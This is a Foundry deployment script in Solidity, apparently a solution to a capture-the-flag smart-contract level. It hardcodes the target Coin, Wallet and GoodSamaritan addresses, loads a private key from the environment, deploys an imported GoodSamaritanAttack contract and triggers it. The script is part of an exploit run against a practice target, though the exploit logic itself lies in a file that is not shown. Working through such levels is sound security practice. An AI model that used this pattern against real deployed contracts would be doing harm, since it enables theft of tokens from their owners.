// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GoodSamaritanAttack} from "../src/GoodSamaritan.sol";

interface Coin {
    function transfer(address dest_, uint256 amount_) external;
}

interface Wallet {
    
}

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract DoubleEntryAttack is Script {
    
    Coin cAddr = Coin(0x00Cb522D1d647651879Fd9f1dDaBCa649Ff2e706);
    Wallet wAddr = Wallet(0xc6F8DC4C6D7EE19BD1aFc83795c550F573C3A075);
    GoodSamaritan gAddr = GoodSamaritan(0x19eBAE64B1892719c6996016bd9Fee9DBFd10EC5);
    
    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        
        GoodSamaritanAttack yo = new GoodSamaritanAttack();
        yo.callMe();
        

        
        vm.stopBroadcast();

    }
}